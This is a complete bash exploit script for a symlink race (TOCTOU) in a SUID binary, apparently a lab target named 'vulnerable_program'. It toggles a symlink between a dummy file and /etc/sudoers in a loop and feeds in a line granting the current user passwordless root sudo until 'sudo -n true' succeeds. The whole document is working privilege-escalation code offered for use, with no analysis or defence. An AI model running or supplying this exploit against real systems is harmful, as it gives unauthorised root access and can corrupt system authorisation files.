#!/bin/bash

# --- CONFIGURATION ---
# The vulnerable SUID binary
VULN_BINARY="./vulnerable_program"
# The file we control (dummy)
OWNED_FILE="/tmp/dummy"
# The Target: Sudoers file
TARGET_FILE="/etc/sudoers"
# The Symlink used for the race
LINK_NAME="race_link"
# Your username (to grant root access to)
MY_USER=$(whoami)
# The Payload: This grants you root sudo access without a password
PAYLOAD="$MY_USER ALL=(ALL) NOPASSWD: ALL"

# --- PREPARATION ---
echo "[*] Preparing files..."
touch $OWNED_FILE

# --- BACKGROUND PROCESS: THE TOGGLER ---
# This loop rapidly switches the symlink between a safe file and the target
echo "[*] Starting the Toggler..."
while true; do
    # Point to safe file (Pass the access() check)
    ln -sf $OWNED_FILE $LINK_NAME
    # Point to target file (Hit the fopen() write)
    ln -sf $TARGET_FILE $LINK_NAME
done &
PID_TOGGLER=$!

# --- MAIN LOOP: THE TRIGGER ---
echo "[*] Starting the Attack Loop. Press Ctrl+C if it takes too long."

# We run until we verify success
SUCCESS=0
count=0

while [ $SUCCESS -eq 0 ]; do
    ((count++))
    
    # Run the binary and pipe the payload into it (assuming scanf is active)
    # If scanf is disabled, this input is ignored, and you risk corrupting sudoers.
    echo "$PAYLOAD" | $VULN_BINARY $LINK_NAME &>/dev/null

    # Check if we succeeded by trying to run sudo without a password
    # strict checking to ensure we don't spam once successful
    if sudo -n true 2>/dev/null; then
        echo ""
        echo "[$] SUCCESS! Race condition won after $count attempts."
        echo "[$] You now have root access. Type 'sudo su' to become root."
        SUCCESS=1
        break
    fi

    # Optional: status update every 100 tries
    if (( count % 100 == 0 )); then
        echo -ne "Attempt: $count...\r"
    fi
done

# --- CLEANUP ---
kill $PID_TOGGLER 2>/dev/null
rm $LINK_NAME $OWNED_FILE
wait $PID_TOGGLER 2>/dev/null
